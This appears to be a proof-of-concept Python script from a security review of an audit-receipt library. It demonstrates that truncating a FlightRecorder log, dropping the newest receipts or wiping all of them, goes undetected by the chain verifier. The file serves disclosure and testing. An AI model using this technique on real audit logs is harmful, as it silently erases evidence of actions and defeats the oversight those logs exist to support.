#!/usr/bin/env python3
"""PoC 3 — Silent log truncation: delete receipts from the end of the
FlightRecorder and the auditor still sees all_links_valid=True.

The recorder format has no EOF marker, no record count, and no signed tip
commitment; verify_chain validates whatever prefix it is handed. Truncating
the newest (most incriminating) records — or wiping ALL of them — is
undetectable from the verifier output. S2.4 / S2.6 / S2.10.
"""
import os, sys, tempfile
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (FlightRecorder, build_receipt, chain_hash,
                         generate_keypair, verify_chain, canonical, sha256_hex)

HUMAN = {"type": "human", "id": "s.lutar", "is_service_account": False,
         "auth_method": "hardware_key", "human_principal": "Stephen P. Lutar"}
POL = {"result": "ALLOW", "policy_hash": sha256_hex(b"policy-v1")}
EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]
EXEC = {"side_effect_class": "WRITE_REVERSIBLE", "status": "EXECUTED"}

sk, pk = generate_keypair()
path = os.path.join(tempfile.mkdtemp(), "fr.bin")
fr = FlightRecorder(path)

rs, prev = [], "GENESIS"
for i in range(3):
    r = build_receipt(action_id=f"a-{i:03d}", subject_name="prod:svc", actor=HUMAN,
                      policy_decision=POL, execution=EXEC, evidence_items=EV,
                      prev_chain_hash=prev, signing_key=sk)
    fr.append(r)
    prev = chain_hash(r)
    rs.append(r)

# Sanity: intact chain is valid.
assert verify_chain(fr.read_all(), pk)["all_links_valid"] is True

# Attack 1: truncate the file at the boundary before record 3 — the newest
# receipt vanishes silently.
lens = [len(canonical(r)) for r in rs]
cut = 24 + (4 + lens[0]) + (4 + lens[1])
with open(path, "r+b") as f:
    f.truncate(cut)
survivors = fr.read_all()                      # no error, no truncation signal
trunc_silent = (len(survivors) == 2
                and verify_chain(survivors, pk)["all_links_valid"] is True)

# Attack 2: wipe everything back to the bare magic header.
with open(path, "r+b") as f:
    f.truncate(24)
wiped = fr.read_all()
wipe_valid = (wiped == [] and verify_chain(wiped, pk)["all_links_valid"] is True)

print("EXPLOIT-WORKS" if (trunc_silent and wipe_valid) else "HELD")
